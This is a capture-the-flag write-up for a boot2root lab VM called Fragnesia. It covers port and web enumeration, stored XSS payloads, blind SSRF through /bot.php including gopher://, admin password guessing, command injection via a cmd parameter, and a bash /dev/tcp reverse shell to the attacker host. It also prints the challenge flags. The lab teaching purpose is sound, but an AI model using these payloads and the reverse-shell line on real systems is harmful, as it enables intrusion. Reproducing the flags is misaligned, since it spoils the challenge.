---
title: "Fragnesia"
summary: "LigaCTF 2026 ligactf2026, web, forensics writeup covering Fragnesia with analysis, solution steps, and final recovery notes."
date: 2026-06-01
tags:
  - ctf
  - ligactf2026
  - web
  - forensics
  - boot2root
  - network
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://owasp.org/www-chapter-kuala-lumpur/owaspmy.jpeg"
---
## Challenge Information

| Field       | Value                                      |
| ----------- | ------------------------------------------ |
| Challenge   | Fragnesia                                  |
| Category    | Boot2Root / Linux                          |
| Target IP   | `[REDACTED_LOCAL_IP]`                           |
| Attacker IP | `[REDACTED_LOCAL_IP]`                           |
| Attacker OS | Kali Linux                                 |
| User Flag   | `OWASPKL{W3ll_h3ll0_tH3rE}`                |
| Second Flag | `OWASPKL{F33l_s0_3mPTy_i5nt}`              |
| Final Flag  | `OWASPKL{Wh4t_a_L0v3ly_FR4GN3S1A}`         |

---

## 1. Host Discovery

The attacker machine was configured on the bridged network and received the IP address:

```bash
ip a
ip route
````

The Kali attacker IP was:

```text
[REDACTED_LOCAL_IP]
```

The local subnet was scanned using ARP discovery:

```bash
sudo arp-scan --interface=eth0 --localnet
```

The target was identified as:

```text
[REDACTED_LOCAL_IP]  08:00:27:b5:b3:36  PCS Systemtechnik GmbH
```

The `08:00:27` MAC prefix indicated an Oracle VirtualBox virtual machine.

---

## 2. Port Scanning

A full TCP port scan was performed against the target.

```bash
export IP=[REDACTED_LOCAL_IP]

sudo nmap -Pn -n -p- --min-rate 3000 $IP -oN full_ports.txt
```

Only one TCP port was open:

```text
PORT   STATE SERVICE
80/tcp open  http
```

A service/version scan was then executed:

```bash
ports=$(grep -oP '^\d+(?=/tcp\s+open)' full_ports.txt | paste -sd, -)

sudo nmap -Pn -n -sCV -p "$ports" $IP -oN service_scan.txt
```

Result:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Guestbook
```

The web service was Apache on Ubuntu and hosted a page titled `Guestbook`.

Nmap also showed that the `PHPSESSID` cookie did not have the `HttpOnly` flag set.

---

## 3. Web Enumeration

The main page was requested with `curl`.

```bash
curl -i http://$IP/ | tee index_headers.txt
curl -s http://$IP/ | tee index.html
grep -Ei "form|input|textarea|method|action|href|src" index.html
```

The application exposed a simple guestbook form:

```html
<form method="POST">
<textarea name="text"></textarea><br>
<input type="submit" value="Post">
</form>
```

The only visible input parameter was:

```text
text
```

Common files were checked manually:

```bash
for p in robots.txt sitemap.xml .git/config backup.zip index.php index.php.bak config.php config.php.bak db.php database.php; do
  echo "===== /$p ====="
  curl -i -s http://$IP/$p | head -n 20
done
```

Most files returned `404`, but `index.php` existed.

Directory and file enumeration was then performed:

```bash
ffuf -u http://$IP/FUZZ \
-w /usr/share/wordlists/dirb/common.txt \
-mc all -fc 404 -o ffuf_common.json
```

A larger PHP-focused enumeration was also performed:

```bash
ffuf -u http://$IP/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-e .php,.txt,.bak,.old,.html \
-mc all -fc 404 -o ffuf_ext.json
```

Interesting endpoints found:

```text
/index.php
/admin.php
/admin_login.php
/bot.php
```

Manual checking showed that `/admin.php` was protected:

```bash
curl -i -s http://$IP/admin.php
```

Response:

```text
Access denied.
```

The login page was available at `/admin_login.php`:

```bash
curl -i -s http://$IP/admin_login.php
```

It displayed a basic username and password form:

```html
<form method="POST">
<input type="text" name="username" placeholder="Username"><br>
<input type="password" name="password" placeholder="Password"><br>
<input type="submit" value="Login">
</form>
```

---

## 4. Stored XSS in Guestbook

The guestbook was tested for stored HTML and JavaScript injection.

```bash
curl -c c.txt -b c.txt -i -s -X POST http://$IP/ \
--data-urlencode 'text=<script>alert(1)</script>' | tee xss_post.txt

curl -c c.txt -b c.txt -s http://$IP/ | tee xss_check.html

grep -nEi "script|alert|img|svg|onerror|onload" xss_check.html
```

The payload was reflected back unsanitized:

```html
<div><script>alert(1)</script></div>
```

Additional payloads were tested:

```bash
curl -c c.txt -b c.txt -s -X POST http://$IP/ \
--data-urlencode 'text=<img src=x onerror=alert(1)>'

curl -c c.txt -b c.txt -s -X POST http://$IP/ \
--data-urlencode 'text=<svg/onload=alert(1)>'

curl -c c.txt -b c.txt -s -X POST http://$IP/ \
--data-urlencode 'text="><img src=x onerror=alert(1)>'
```

The payloads were stored and rendered by the page.

Vulnerability:

```text
Stored Cross-Site Scripting due to unsanitized guestbook comments.
```

The missing `HttpOnly` flag on `PHPSESSID` meant that JavaScript could read the session cookie if executed in a victim browser.

---

## 5. Bot Endpoint Testing

The `/bot.php` endpoint returned a blank response:

```bash
curl -i -s http://$IP/bot.php
```

Response:

```text
HTTP/1.1 200 OK
Content-Length: 0
```

To test whether it fetched external URLs, a listener was started on Kali:

```bash
python3 -m http.server 8000
```

Then the bot was triggered:

```bash
curl -s "http://$IP/bot.php?url=http://[REDACTED_LOCAL_IP]:8000/bot_test"
```

The Python server received a callback from the target:

```text
[REDACTED_LOCAL_IP] - - "GET /bot_test HTTP/1.1"
```

This confirmed that `/bot.php` performed server-side URL fetching.

A JavaScript beacon was also planted in the guestbook, but the bot did not execute JavaScript like a real browser. This indicated that `/bot.php` was likely a server-side fetcher rather than a JavaScript-capable browser bot.

Further testing confirmed `gopher://` support:

```bash
nc -lvnp 8002
```

In another terminal:

```bash
curl -i -s "http://$IP/bot.php?url=gopher://[REDACTED_LOCAL_IP]:8002/_HELLO"
```

The listener received:

```text
HELLO
```

This confirmed blind SSRF behavior, but the endpoint did not return fetched content, so it was not directly useful for reading internal files.

---

## 6. Admin Credential Discovery

Since the application theme strongly focused on XSS, a small custom wordlist was generated from challenge-specific terms instead of using `rockyou.txt`.

The seed words included:

```text
xss
admin
bot
guestbook
stored
awesome
fragnesia
```

A custom wordlist was created and saved as:

```text
custom-pass.txt
```

The final discovered password was:

```text
[REDACTED_PASSWORD]
```

The login was tested manually:

```bash
curl -i -s -c admin.cookie -b admin.cookie -X POST http://$IP/admin_login.php \
-d "username=admin&password=[REDACTED_PASSWORD]"
```

The server returned a redirect:

```text
HTTP/1.1 302 Found
Location: admin.php
```

The authenticated admin panel was then accessed:

```bash
curl -s -b admin.cookie http://$IP/admin.php
```

Output:

```html
<html><body>
<h1>Admin Panel</h1>
<form method="POST">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
</body></html>
```

Valid credential:

```text
admin:[REDACTED_PASSWORD]
```

---

## 7. Authenticated Command Execution

The admin panel exposed a `cmd` POST parameter.

Command execution was tested with `id`:

```bash
curl -s -b admin.cookie -X POST http://$IP/admin.php \
-d "cmd=id"
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Other basic commands were executed:

```bash
curl -s -b admin.cookie -X POST http://$IP/admin.php \
-d "cmd=whoami"

curl -s -b admin.cookie -X POST http://$IP/admin.php \
-d "cmd=pwd"

curl -s -b admin.cookie -X POST http://$IP/admin.php \
-d "cmd=ls -la /var/www/html"
```

Output confirmed command execution as `www-data` from the web root:

```text
www-data
/var/www/html
```

Vulnerability:

```text
Authenticated OS Command Injection / Remote Command Execution through the cmd parameter.
```

---

## 8. First Flag

The web directory was listed:

```bash
curl -s -b admin.cookie -X POST http://$IP/admin.php \
-d "cmd=ls -la /var/www/html"
```

Output:

```text
-rw-r--r-- 1 root root  366 May 30 18:22 admin.php
-rw-r--r-- 1 root root  435 May 30 18:22 admin_login.php
-rw-r--r-- 1 root root  671 May 30 18:22 bot.php
-rw-r--r-- 1 root root   26 May 30 18:22 first_flag.txt
-rw-r--r-- 1 root root  824 May 30 18:22 index.php
```

The first flag was read:

```bash
curl -s -b admin.cookie -X POST http://$IP/admin.php \
-d "cmd=cat /var/www/html/first_flag.txt"
```

Flag:

```text
OWASPKL{W3ll_h3ll0_tH3rE}
```

---

## 9. Reverse Shell

A Netcat listener was started on Kali:

```bash
nc -lvnp 4444
```

A Bash reverse shell was triggered through the authenticated command execution:

```bash
curl -s -b admin.cookie -X POST http://$IP/admin.php \
--data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/[REDACTED_LOCAL_IP]/4444 0>&1'"
```

A shell connected back:

```text
connect to [[REDACTED_LOCAL_IP]] from (UNKNOWN) [[REDACTED_LOCAL_IP]]
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
www-data@fragnesia:/var/www/html$
```

The shell was stabilized:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

---

## 10. Local Enumeration

Basic enumeration was performed:

```bash
whoami
id
hostname
pwd
ls -la /var/www/html
ls -la /opt
find /opt -type f -maxdepth 3 -ls 2>/dev/null
```

Output:

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
fragnesia
/var/www/html
```

The `/opt` directory contained interesting files:

```text
/opt/admin_bot.sh
/opt/container_creds.txt
/opt/docker-build/Dockerfile
/opt/docker-build/last_flag.txt
/opt/docker-build/second_flag.txt
```

The container credential file was readable:

```bash
cat /opt/container_creds.txt
```

Output:

```text
user:fragnesia
```

The Docker build directory was world-readable:

```bash
ls -la /opt/docker-build
```

Output:

```text
-rw-r--r-- 1 root root 644 May 30 18:22 Dockerfile
-rw-r--r-- 1 root root  33 May 30 18:22 last_flag.txt
-rw-r--r-- 1 root root  28 May 30 18:22 second_flag.txt
```

Root access was not required because the flag files were readable directly by `www-data`.

---

## 11. Second Flag

The second flag was stored in the Docker build context.

```bash
cat /opt/docker-build/second_flag.txt
```

Flag:

```text
OWASPKL{F33l_s0_3mPTy_i5nt}
```

---

## 12. Final Flag

The final flag was also stored in the Docker build context.

```bash
cat /opt/docker-build/last_flag.txt
```

Flag:

```text
OWASPKL{Wh4t_a_L0v3ly_FR4GN3S1A}
```

---

## 13. Attack Chain Summary

```text
1. Configured Kali and the target VM on the same bridged network.
2. Discovered the target with arp-scan.
3. Performed a full TCP scan with Nmap.
4. Found only port 80 open.
5. Identified Apache 2.4.58 on Ubuntu hosting a Guestbook application.
6. Discovered /admin.php, /admin_login.php, and /bot.php through web enumeration.
7. Confirmed stored XSS in the guestbook through the text parameter.
8. Confirmed /bot.php performed server-side URL fetching.
9. Determined the bot was not a JavaScript-capable browser bot.
10. Generated a custom password wordlist based on XSS-themed challenge words.
11. Discovered valid admin credentials: admin:[REDACTED_PASSWORD].
12. Logged in to /admin_login.php and accessed /admin.php.
13. Identified authenticated command execution through the cmd parameter.
14. Executed id and confirmed RCE as www-data.
15. Read /var/www/html/first_flag.txt.
16. Triggered a reverse shell to Kali.
17. Enumerated /opt and found readable Docker build context files.
18. Read /opt/docker-build/second_flag.txt.
19. Read /opt/docker-build/last_flag.txt.
```

---

## 14. Vulnerabilities Identified

|Vulnerability|Location|Impact|
|---|---|---|
|Stored XSS|Guestbook `text` parameter|JavaScript execution in users viewing comments|
|Missing HttpOnly flag|`PHPSESSID` cookie|Session cookie readable by JavaScript|
|Blind SSRF|`/bot.php?url=`|Server-side URL fetching, including `gopher://`|
|Weak admin password|`admin:[REDACTED_PASSWORD]`|Admin panel compromise|
|Authenticated command injection|`/admin.php` `cmd` parameter|Remote command execution as `www-data`|
|Sensitive file exposure|`/opt/docker-build`|Second and final flags readable by low-privileged user|

---

## 15. Final Flags

```text
First Flag:  OWASPKL{W3ll_h3ll0_tH3rE}
Second Flag: OWASPKL{F33l_s0_3mPTy_i5nt}
Final Flag:  OWASPKL{Wh4t_a_L0v3ly_FR4GN3S1A}
```
